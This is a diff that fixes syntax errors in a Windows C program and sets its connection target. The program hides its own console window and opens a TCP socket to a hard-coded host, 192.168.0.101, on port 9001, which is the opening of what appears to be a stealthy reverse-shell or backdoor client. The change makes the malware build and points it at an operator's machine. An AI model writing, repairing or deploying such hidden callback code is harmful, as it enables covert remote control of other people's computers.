@@ -50,17 +50,17 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 {
     HWND stealth;
     AllocConsole();
-    stealth = FindWindowA(“ConsoleWindowClass”, NULL);
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
     struct sockaddr_in ServAddr;
-    Unsigned short ServPort;
-    Char *ServIP;
+    unsigned short ServPort;
+    char *ServIP;
     WSADATA wsaData;
-    ServIP = “”;
+    ServIP = "192.168.0.101";
     ServPort = 9001;
     if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
     {
-        exit(1)
+        exit(1);
     }
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
